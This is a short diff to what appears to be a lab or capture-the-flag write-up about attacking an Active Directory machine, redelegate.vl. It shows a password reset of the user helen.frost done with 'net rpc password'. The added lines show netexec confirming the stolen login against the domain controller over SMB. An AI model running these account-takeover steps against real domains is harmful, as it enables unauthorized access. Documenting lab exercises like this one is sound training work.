@@ -506,6 +506,11 @@ net rpc password "helen.frost" 'Password123!' -U "redelegate.vl"/"marie.curie"%'
 This changed the users password
 
 ```python
-
+nxc smb dc.redelegate.vl -u helen.frost -p 'Password123!'                   
+SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.50   445    DC               [+] redelegate.vl\helen.frost:Password123!
 ```
+As seen here the password has now been changed and the user has been compromised
+
+
 
